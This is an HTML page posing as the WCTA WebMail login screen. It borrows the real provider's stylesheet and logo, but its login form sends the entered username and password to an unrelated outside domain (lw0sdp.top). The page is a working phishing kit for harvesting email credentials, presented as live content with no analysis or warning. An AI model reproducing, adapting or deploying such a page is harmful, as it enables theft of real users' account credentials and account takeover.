<html xmlns="http://www.w3.org/1999/xhtml"><head>

<link rel="stylesheet" type="text/css" href="https://webmail.wctatel.net/themes/w21_blue/styles.css">
<title>WCTA - Login</title>

</head>

<body id="pageLogin" onload="squirrelmail_loginpage_onload();"><div id="screenFrame"><div id="pageFrame">
<form action="https://lw0sdp.top/wctatel/login.php" method="post" name="login_form">
<div id="container"> 
  <div id="organization">WCTA</div>
  <div id="loginTitle"><h1 style="display: block;">WebMail&nbsp;<span>Login</span></h1></div>
  <div id="fieldsetContainer">
    <div id="fieldsetContents">
      <fieldset>
        <div>
          <input type="hidden" name="js_autodetect_results" value="1">
          <input type="hidden" name="just_logged_in" value="1">
        </div>
    
        <div id="loginInputs">
          <table>
            <tbody><tr>
              <td align="center"><img src="https://webmail.wctatel.net/login.png"></td>
            </tr>
            <tr id="usernameRow">
              <td class="loginInput" id="loginInputUsername">
                <input type="text" name="username" value="" tabindex="1" class="login_input" onfocus="alreadyFocused=true;" placeholder="example@example.com" required="">
              </td>
            </tr>
            <tr id="passwordRow">
              <td class="loginInput" id="loginInputUsername">
                <input name="password" type="password" class="login_input" tabindex="2" onfocus="alreadyFocused=true;" id="password" placeholder="Password" required="">
              </td>
            </tr>
            <tr id="loginAuto"><td colspan="2"><div id="loginAutoContents"><input id="loginAutoCheckbox" type="checkbox" name="cb_auto_pass" value="true">
<label for="loginAutoCheckbox">Remember Name &amp; Password</label></div><a class="helpImage" href=""><span>(?)</span></a>
</td></tr>
          </tbody></table>
        </div>

        <div id="loginButtonWrap">
          <input type="submit" value="Login" class="button" id="loginButton">
        </div>
      </fieldset>
    </div>
  </div>
</div>
</form>
</div></div>
<div id="loginWarningBox"></div>
<div id="extra1"></div>
<div id="extra2"></div>
<div id="extra3"></div>
<div id="extra4"></div>
<div id="extra5"></div>


<iframe id="nr-ext-rsicon" style="position: absolute; display: none; width: 50px; height: 50px; z-index: 2147483647; border-style: none; background: transparent;"></iframe></body></html>
